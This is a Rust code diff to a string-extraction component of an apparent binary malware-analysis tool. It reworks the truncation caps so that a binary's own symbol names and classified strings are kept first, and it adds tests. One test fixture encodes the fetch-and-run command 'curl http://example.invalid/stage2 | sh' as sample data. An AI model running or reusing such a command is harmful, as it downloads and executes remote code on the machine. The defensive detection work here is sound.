@@ -88,7 +88,10 @@ fn stng_method_to_string(method: StringMethod) -> &'static str {
     }
 }
 
-pub(crate) const MAX_STRINGS_PER_FILE: usize = 100_000;
+/// Per-file cap on retained strings. 200k, doubled from 100k: large Go, Rust
+/// and LLVM monoliths (75 MB+, measured 2026-09-24) all hit 100k, and a
+/// backdoor spliced into one sat past the cut.
+pub(crate) const MAX_STRINGS_PER_FILE: usize = 200_000;
 
 /// Maximum total bytes of all extracted strings (50 MB).
 pub(crate) const MAX_TOTAL_STRING_BYTES: usize = 50 * 1024 * 1024;
@@ -99,8 +102,17 @@ pub(crate) struct StringExtractor {
     min_length: usize,
     // Unified map for O(1) classification: normalized_name -> (Type, Optional Library)
     symbol_map: HashMap<String, (StringType, Option<String>)>,
+    /// Folded names of the file's own functions/imports/exports (see
+    /// [`Self::symbol_key`]). When the caps bind, strings naming one of these
+    /// are retained first, so the code-structure strings (a Go binary's
+    /// pclntab names) are not what falls off the end.
+    priority_names: std::sync::RwLock<rustc_hash::FxHashSet<u64>>,
     /// Whether the last extraction was truncated due to limits
     pub truncated: std::sync::atomic::AtomicBool,
+    /// Rows offered to the last conversion, before any cap.
+    pub extracted_count: std::sync::atomic::AtomicUsize,
+    /// Rows the last conversion kept (including base64 sidecars).
+    pub retained_count: std::sync::atomic::AtomicUsize,
 }
 
 #[allow(dead_code)] // Public API used by main.rs binary
@@ -109,8 +121,88 @@ impl StringExtractor {
         Self {
             min_length: 4,
             symbol_map: HashMap::new(),
+            priority_names: std::sync::RwLock::new(rustc_hash::FxHashSet::default()),
             truncated: std::sync::atomic::AtomicBool::new(false),
+            extracted_count: std::sync::atomic::AtomicUsize::new(0),
+            retained_count: std::sync::atomic::AtomicUsize::new(0),
         }
+    }
+
+    /// Names to keep ahead of everything else when the caps bind.
+    pub(crate) fn set_priority_names<'n>(&self, names: impl IntoIterator<Item = &'n str>) {
+        let set = names.into_iter().map(Self::symbol_key).collect();
+        *self
+            .priority_names
+            .write()
+            .unwrap_or_else(std::sync::PoisonError::into_inner) = set;
+    }
+
+    /// A name folded so a raw string and a disassembler's rendering of the
+    /// same symbol meet: rizin writes Go's
+    /// `github.com/acme/tool/pkg._ad79680770be` as
+    /// `sym.go.github.com_acme_tool_pkg._ad79680770be`. Dropping the tool
+    /// prefix and folding every non-alphanumeric byte to `_` makes both the
+    /// same key.
+    fn symbol_key(name: &str) -> u64 {
+        use std::hash::Hasher;
+        let name = ["sym.imp.", "sym.go.", "sym.", "fcn.", "imp."]
+            .iter()
+            .find_map(|p| name.strip_prefix(p))
+            .unwrap_or(name);
+        let mut h = rustc_hash::FxHasher::default();
+        for b in name.bytes() {
+            h.write_u8(if b.is_ascii_alphanumeric() { b } else { b'_' });
+        }
+        h.finish()
+    }
+
+    /// Prioritise the report's own function, import and export names (see
+    /// [`Self::set_priority_names`]). Call before converting its strings.
+    pub(crate) fn prioritize_report_symbols(&self, report: &crate::types::AnalysisReport) {
+        self.set_priority_names(
+            report
+                .functions
+                .iter()
+                .map(|f| f.name.as_str())
+                .chain(report.imports.iter().map(|i| i.symbol.as_str()))
+                .chain(report.exports.iter().map(|e| e.symbol.as_str())),
+        );
+    }
+
+    /// Description for the `metadata/strings-truncated` finding: what was kept
+    /// against what was there, not just the configured limits.
+    pub(crate) fn truncation_desc(&self) -> String {
+        use std::sync::atomic::Ordering;
+        format!(
+            "String extraction truncated: kept {} of {} strings (limits: {} strings, {} MB)",
+            self.retained_count.load(Ordering::SeqCst),
+            self.extracted_count.load(Ordering::SeqCst),
+            MAX_STRINGS_PER_FILE,
+            MAX_TOTAL_STRING_BYTES / (1024 * 1024)
+        )
+    }
+
+    /// Write the extraction counts into `metrics`. `strings.extracted_count`
+    /// is every row offered, `strings.retained_count` what survived the
+    /// per-file caps, and `strings.truncated` whether they bound. Rules can
+    /// see how much of a binary text matchers actually searched.
+    pub(crate) fn record_count_metrics(
+        &self,
+        metrics: &mut std::collections::BTreeMap<String, f64>,
+    ) {
+        use std::sync::atomic::Ordering;
+        metrics.insert(
+            "strings.extracted_count".to_string(),
+            self.extracted_count.load(Ordering::SeqCst) as f64,
+        );
+        metrics.insert(
+            "strings.retained_count".to_string(),
+            self.retained_count.load(Ordering::SeqCst) as f64,
+        );
+        metrics.insert(
+            "strings.truncated".to_string(),
+            f64::from(u8::from(self.truncated.load(Ordering::SeqCst))),
+        );
     }
 
     pub(crate) fn with_min_length(mut self, min_length: usize) -> Self {
@@ -188,12 +280,45 @@ impl StringExtractor {
         source: impl Iterator<Item = &'a ExtractedString>,
         len_hint: usize,
     ) -> Vec<StringInfo> {
+        use std::sync::atomic::Ordering;
+        let rows: Vec<&ExtractedString> = source.collect();
+        self.extracted_count.store(rows.len(), Ordering::SeqCst);
+        self.truncated.store(false, Ordering::SeqCst);
+
+        // Under the caps nothing is dropped, so order is untouched. Over them,
+        // take the rows that name the file's own symbols first, then the ones
+        // stng classified, then the rest; each tier in offset order. The
+        // result is re-sorted by offset below, so consumers see the same
+        // ordering they always did.
+        let total_bytes_offered: usize = rows.iter().map(|r| r.value.len()).sum();
+        let over_cap =
+            rows.len() > MAX_STRINGS_PER_FILE || total_bytes_offered > MAX_TOTAL_STRING_BYTES;
+        let ordered: Vec<&ExtractedString> = if over_cap {
+            let priority = self
+                .priority_names
+                .read()
+                .unwrap_or_else(std::sync::PoisonError::into_inner);
+            let tier = |es: &ExtractedString| -> u8 {
+                if !priority.is_empty() && priority.contains(&Self::symbol_key(&es.value)) {
+                    0
+                } else if es.kind.is_some() {
+                    1
+                } else {
+                    2
+                }
+            };
+            let mut ranked = rows.clone();
+            // Stable: equal tiers keep their original (offset) order.
+            ranked.sort_by_key(|es| tier(es));
+            ranked
+        } else {
+            rows
+        };
+
         let mut strings = Vec::with_capacity(len_hint.min(MAX_STRINGS_PER_FILE));
         let mut total_bytes = 0;
-        self.truncated
-            .store(false, std::sync::atomic::Ordering::SeqCst);
 
-        for es in source {
+        for es in ordered {
             if strings.len() >= MAX_STRINGS_PER_FILE {
                 self.truncated
                     .store(true, std::sync::atomic::Ordering::SeqCst);
@@ -204,6 +329,11 @@ impl StringExtractor {
             if total_bytes + value_len > MAX_TOTAL_STRING_BYTES {
                 self.truncated
                     .store(true, std::sync::atomic::Ordering::SeqCst);
+                // Ranked: one oversized row must not starve the smaller ones
+                // behind it. Unranked (offset order) keeps the old cut-off.
+                if over_cap {
+                    continue;
+                }
                 break;
             }
 
@@ -227,6 +357,11 @@ impl StringExtractor {
                 strings.push(decoded);
             }
         }
+        if over_cap {
+            // Stable, so a base64 sidecar (same offset) stays after its source.
+            strings.sort_by_key(|s| s.offset.unwrap_or(u64::MAX));
+        }
+        self.retained_count.store(strings.len(), Ordering::SeqCst);
         strings
     }
 
@@ -478,5 +613,136 @@ mod tests {
         assert_eq!(StringExtractor::normalize_symbol("fcn.main"), "main");
         assert_eq!(StringExtractor::normalize_symbol("_printf"), "printf");
         assert_eq!(StringExtractor::normalize_symbol("normal"), "normal");
+    }
+
+    fn raw_row(value: &str, offset: u64) -> ExtractedString {
+        ExtractedString {
+            value: value.to_string(),
+            data_offset: offset,
+            method: StringMethod::RawScan,
+            ..Default::default()
+        }
+    }
+
+    #[test]
+    fn symbol_key_meets_rizin_go_rendering() {
+        assert_eq!(
+            StringExtractor::symbol_key("github.com/acme/tool-x/internal/pkg._ad79680770be"),
+            StringExtractor::symbol_key("sym.go.github.com_acme_tool_x_internal_pkg._ad79680770be")
+        );
+        assert_ne!(
+            StringExtractor::symbol_key("pkg.alpha"),
+            StringExtractor::symbol_key("pkg.beta")
+        );
+    }
+
+    /// Under the caps nothing moves and the counts are exact.
+    #[test]
+    fn counts_are_recorded_without_truncation() {
+        let extractor = StringExtractor::new();
+        let raw: Vec<_> = (0..10).map(|i| raw_row(&format!("row{i:04}"), i)).collect();
+        let out = extractor.convert_stng_strings(&raw);
+        let mut m = std::collections::BTreeMap::new();
+        extractor.record_count_metrics(&mut m);
+        assert_eq!(out.len(), 10);
+        assert_eq!(m["strings.extracted_count"], 10.0);
+        assert_eq!(m["strings.retained_count"], 10.0);
+        assert_eq!(m["strings.truncated"], 0.0);
+    }
+
+    /// Over the byte cap, one oversized row is skipped rather than ending the
+    /// pass: the small row behind it must still be kept.
+    #[test]
+    fn byte_cap_skips_oversized_row_and_keeps_going() {
+        let big = "A".repeat(MAX_TOTAL_STRING_BYTES / 2 + 1024);
+        let raw = vec![raw_row(&big, 0), raw_row(&big, 1), raw_row("smallone", 2)];
+        let extractor = StringExtractor::new();
+        let out = extractor.convert_stng_strings(&raw);
+        let values: Vec<&str> = out.iter().map(|s| &*s.value).collect();
+        assert!(
+            values.contains(&"smallone"),
+            "row after the oversized one was lost"
+        );
+        assert_eq!(out.len(), 2);
+        assert!(
+            extractor
+                .truncated
+                .load(std::sync::atomic::Ordering::SeqCst)
+        );
+    }
+
+    /// Over the count cap, a row stng classified outranks unclassified filler
+    /// even at the end of the file, and a base64 row's decoded sidecar stays
+    /// directly after it once the kept set is re-sorted by offset.
+    #[test]
+    fn classified_rows_outrank_filler_and_sidecars_stay_adjacent() {
+        use base64::Engine as _;
+        let cap = MAX_STRINGS_PER_FILE;
+        let mut raw: Vec<_> = (0..cap as u64 + 10)
+            .map(|i| raw_row(&format!("filler{i:08}"), i))
+            .collect();
+        let encoded = general_purpose::STANDARD.encode("curl http://example.invalid/stage2 | sh");
+        let mut b64 = raw_row(&encoded, cap as u64 + 10);
+        b64.kind = Some(StringType::Base64);
+        raw.push(b64);
+
+        let extractor = StringExtractor::new();
+        let out = extractor.convert_stng_strings(&raw);
+        assert_eq!(out.len(), cap);
+        let at = out
+            .iter()
+            .position(|s| *s.value == *encoded)
+            .expect("classified row was cut");
+        assert_eq!(
+            out.get(at + 1).map(|s| &*s.value),
+            Some("curl http://example.invalid/stage2 | sh"),
+            "decoded sidecar must follow its source"
+        );
+    }
+
+    #[test]
+    fn truncation_desc_reports_kept_of_offered() {
+        let cap = MAX_STRINGS_PER_FILE;
+        let raw: Vec<_> = (0..cap as u64 + 7)
+            .map(|i| raw_row(&format!("filler{i:08}"), i))
+            .collect();
+        let extractor = StringExtractor::new();
+        let _ = extractor.convert_stng_strings(&raw);
+        let desc = extractor.truncation_desc();
+        assert!(
+            desc.contains(&format!("kept {cap} of {}", cap + 7)),
+            "{desc}"
+        );
+    }
+
+    /// Over the count cap, a string naming one of the file's own symbols
+    /// survives even when it sits past the cut in offset order -- a
+    /// backdoor's pclntab names at the end of a large Go binary -- and the
+    /// kept set is still in offset order.
+    #[test]
+    fn own_symbol_names_survive_the_cap() {
+        let cap = MAX_STRINGS_PER_FILE;
+        let mut raw: Vec<_> = (0..cap as u64 + 50)
+            .map(|i| raw_row(&format!("filler{i:08}"), i))
+            .collect();
+        let tail = "github.com/acme/tool/pkg._ad79680770be";
+        raw.push(raw_row(tail, cap as u64 + 50));
+
+        let extractor = StringExtractor::new();
+        extractor.set_priority_names(["sym.go.github.com_acme_tool_pkg._ad79680770be"]);
+        let out = extractor.convert_stng_strings(&raw);
+
+        assert_eq!(out.len(), cap);
+        assert!(
+            out.iter().any(|s| &*s.value == tail),
+            "priority name was cut"
+        );
+        assert!(out.windows(2).all(|w| w[0].offset <= w[1].offset));
+
+        let mut m = std::collections::BTreeMap::new();
+        extractor.record_count_metrics(&mut m);
+        assert_eq!(m["strings.extracted_count"], (cap + 51) as f64);
+        assert_eq!(m["strings.retained_count"], cap as f64);
+        assert_eq!(m["strings.truncated"], 1.0);
     }
 }
